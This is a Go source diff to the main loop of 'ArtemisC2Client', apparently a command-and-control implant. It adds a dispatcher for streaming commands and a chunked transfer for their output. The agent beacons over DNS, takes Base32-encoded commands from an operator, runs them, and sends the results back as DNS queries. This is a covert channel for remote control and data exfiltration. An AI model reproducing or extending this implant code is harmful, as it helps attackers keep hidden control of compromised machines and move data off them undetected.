@@ -6,6 +6,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/desertcod98/ArtemisC2Client/chunkedtransfer"
 	"github.com/desertcod98/ArtemisC2Client/commands"
 	"github.com/desertcod98/ArtemisC2Client/config"
 	"github.com/desertcod98/ArtemisC2Client/dns"
@@ -29,6 +30,7 @@ func main() {
 
 	ctx := initContext(cfg)
 	cmdDispatcher := commands.NewDispatcher(ctx)
+	streamCmdDispatcher := commands.NewStreamDispatcher(ctx)
 
 	fmt.Println("Agent id:", cfg.AgentId)
 
@@ -38,7 +40,7 @@ func main() {
 	for {
 		select {
 		case <-ticker.C:
-			doBeacon(cfg, cmdDispatcher)
+			doBeacon(cfg, cmdDispatcher, streamCmdDispatcher)
 		case newBeaconInterval := <-ctx.SetBeaconIntervalCh:
 			ticker.Stop()
 			cfg.BeaconInterval = newBeaconInterval
@@ -60,7 +62,7 @@ func doHandshake() (string, error) {
 	return dns.DnsQuery(handshakeRes)
 }
 
-func doBeacon(cfg *config.Config, cmdDispatcher map[string]commands.Command) {
+func doBeacon(cfg *config.Config, cmdDispatcher map[string]commands.Command, streamCmdDispatcher map[string]commands.StreamCommand) {
 	beaconRes, beaconErr := dns.DnsQuery(cfg.AgentId + ".Beacon")
 	if beaconErr != nil {
 		fmt.Println("Error:", beaconErr)
@@ -76,13 +78,40 @@ func doBeacon(cfg *config.Config, cmdDispatcher map[string]commands.Command) {
 	utils.ReverseStringArr(commandSplit)
 	job := commandSplit[0]
 	commandType := commandSplit[1]
-	commandArgs := commandSplit[2:]
+	commandArgsEncoded := commandSplit[2:]
+	var commandArgs []string
 
-	if cmd, ok := cmdDispatcher[strings.ToLower(commandType)]; ok {
-		resultChan := cmd.Execute(commandArgs)
-		result := <-resultChan
-		dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
+	for _, arg := range commandArgsEncoded {
+			decoded, err := encoding.Base32DecodeNoPadding(arg)
+			if err != nil {
+					fmt.Println("Error decoding command arg:", err)
+					return
+			}
+			commandArgs = append(commandArgs, string(decoded))
 	}
+
+
+	cmdType := strings.ToLower(commandType)
+
+	if cmd, ok := cmdDispatcher[cmdType]; ok {
+		go collectAndSendResult(cmd, commandArgs, job)
+		return
+	}
+	if streamCmd, ok := streamCmdDispatcher[cmdType]; ok {
+		go collectAndSendStreamResult(streamCmd, commandArgs, job)
+		return
+	}	
+}
+
+func collectAndSendResult(cmd commands.Command, commandArgs []string, job string) {
+	result := cmd.Execute(commandArgs)
+	dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
+}
+
+func collectAndSendStreamResult(cmd commands.StreamCommand, commandArgs []string, job string) {
+	stream, totalBytes := cmd.Execute(commandArgs)
+	transfer := chunkedtransfer.NewTransfer(job, stream, totalBytes)
+	transfer.Send()
 }
 
 func initContext(cfg *config.Config) *config.Context {
@@ -91,5 +120,3 @@ func initContext(cfg *config.Config) *config.Context {
 		SetBeaconIntervalCh: make(chan int, 1),
 	}
 }
-
-
